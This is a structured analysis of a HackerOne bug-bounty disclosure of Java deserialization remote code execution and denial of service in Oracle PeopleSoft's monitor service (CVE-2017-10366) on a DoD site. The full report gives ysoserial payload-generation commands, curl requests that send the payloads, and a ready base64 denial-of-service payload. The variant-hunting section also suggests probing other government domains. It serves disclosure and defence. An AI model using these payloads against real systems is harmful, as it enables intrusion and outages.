# Remote Code Execution via Java Object Deserialization in Oracle PeopleSoft (CVE-2017-10366)

## Metadata
- **Source:** HackerOne
- **Report:** 329399 | https://hackerone.com/reports/329399
- **Submitted:** 2018-03-24
- **Reporter:** joaomatosf
- **Program:** U.S. Department of Defense (HackerOne)
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Insecure Deserialization, CWE-502: Deserialization of Untrusted Data, Remote Code Execution, Denial of Service
- **CVEs:** CVE-2017-10366
- **Category:** memory-binary

## Summary
Oracle PeopleSoft's 'monitor' service on a DoD website deserializes untrusted Java objects without validation, enabling remote code execution and denial of service attacks. The vulnerability stems from the readObject() method processing malicious serialized Java objects, directly related to CVE-2017-10366. Attackers can execute arbitrary code or crash the service by sending specially crafted payloads.

## Attack scenario
1. Attacker identifies a DoD website running vulnerable Oracle PeopleSoft on /psc/EXPROD/ path
2. Attacker uses ysoserial tool to generate malicious serialized Java object payload (e.g., URLDNS gadget chain)
3. Attacker sends HTTP POST request with binary serialized payload to the monitor service endpoint
4. PeopleSoft's vulnerable readObject() deserializes the payload without type checking or validation
5. Gadget chain execution occurs during deserialization, triggering arbitrary code (DNS lookup, reverse shell, memory exhaustion)
6. Attacker achieves RCE or DoS, as demonstrated by successful DNS query from target server to attacker's nameserver

## Root cause
Oracle PeopleSoft's monitor service accepts and deserializes untrusted serialized Java objects via the readObject() method without implementing object type whitelisting, filtering, or validation. The application trusts all incoming serialized data and processes gadget chains present in classpath libraries (commons-collections, etc.), allowing attackers to exploit known deserialization gadgets.

## Attacker mindset
An attacker targeting critical DoD infrastructure would exploit known CVEs in widely-deployed enterprise software to establish persistence, exfiltrate data, or disrupt operations. The use of ysoserial indicates sophisticated knowledge of Java deserialization attacks and gadget chain exploitation. The attacker demonstrates restraint by using DNS exfiltration for PoC rather than actual RCE, and declining to execute DoS due to availability concerns—suggesting ethical responsibility despite discovering critical vulnerability.

## Defensive takeaways
- Never deserialize untrusted data; implement input validation and object type whitelisting before deserialization
- Disable or restrict access to unnecessary services like /monitor endpoints, especially from the internet
- Apply principle of least privilege: restrict network access to internal monitoring services only
- Implement strict serialization filters using Java 9+ ObjectInputFilter or similar mechanisms
- Keep Java and third-party libraries (commons-collections, commons-beanutils, etc.) updated, but recognize this alone is insufficient
- Monitor for suspicious deserialization exceptions and DNS/network activity from application servers
- Conduct regular vulnerability assessments and penetration testing on exposed Java applications
- Use Web Application Firewalls (WAF) to detect and block suspicious serialized object patterns
- Segment networks to limit impact of compromised servers; monitor egress traffic from application servers

## Variant hunting
Search for other PeopleSoft endpoints exposed publicly (e.g., /portal, /psc/, /ps/, /webprofile)
Identify other Oracle PeopleSoft versions vulnerable to CVE-2017-10366 or related deserialization CVEs (CVE-2016-3720, CVE-2018-2620)
Hunt for similar deserialization vulnerabilities in other Java-based enterprise platforms (SAP, IBM WebSphere, JBoss)
Look for exposed Java RMI, JMX, or JNDI services that may be vulnerable to similar attacks
Test other government/DoD domains for identical PeopleSoft configurations and CVE-2017-10366 exposure
Search for services accepting serialized Java objects without documented security controls

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1203: Exploitation for Client Execution
- T1059: Command and Scripting Interpreter
- T1570: Lateral Tool Transfer
- T1498: Network Denial of Service
- T1040: Network Sniffing (DNS exfiltration verification)

## Notes
This report demonstrates a critical vulnerability in a high-value government target. The researcher's use of DNS exfiltration as PoC is elegant—it proves code execution without causing operational damage. The DoS payload generates OutOfMemoryError by deserializing deeply nested objects. CVE-2017-10366 is well-documented; multiple tools (ysoserial, JexBoss) automate exploitation. The attacker's recommendation to block /monitor entirely rather than patching reflects the fundamental nature of deserialization vulnerabilities—gadget chains evolve faster than patches. This vulnerability likely affects many DoD systems running legacy PeopleSoft versions.

## Full report
<details><summary>Expand</summary>

SUMMARY:
====================

The DoD **`https://███/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://█████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:29:54.523 queries: info: client ███#5691: query: dod.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://██████████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

</details>

---
*Analysed by Claude on 2026-05-12*
